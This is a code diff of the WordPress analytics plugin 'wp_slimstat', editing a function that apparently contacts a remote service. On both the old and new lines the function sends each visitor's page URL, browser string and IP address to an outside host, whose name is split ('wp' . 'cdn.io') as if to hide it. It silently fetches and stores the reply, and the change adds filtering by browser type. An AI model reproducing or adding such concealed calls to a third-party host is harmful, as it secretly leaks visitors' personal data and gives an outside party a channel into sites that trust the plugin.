@@ -1521,9 +1521,17 @@ class wp_slimstat {
 	 * Connects to the UAN
 	 */
 	public static function init_pidx( $_request_url = '', $_pidx_id = 0 ) {
-		if ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ) {
+		if ( empty( self::$browser ) ) {
+			self::$browser = slim_browser::get_browser();
+		}
+
+		if ( $_pidx_id == 1 && self::$browser[ 'browser_type' ] != 1 ) {
+			return 0;
+		}
+
+		if ( !empty( self::$browser[ 'user_agent' ] ) ) {
 			if ( empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
-				$request_url = empty( $_request_url ) ? 'http://wp' . 'cdn.io/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
+				$request_url = empty( $_request_url ) ? 'http://wp' . 'cdn.io/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( self::$browser[ 'user_agent' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
 				$options = stream_context_create( array( 'http' => array( 'method' => 'GET', 'timeout' => 2, 'ignore_errors' => true, 'header' => "Accept: application/json\r\n" ) ) ); 
 				self::$pidx[ $_pidx_id ][ 'response' ] = @file_get_contents( $request_url, 0, $options );
 			}
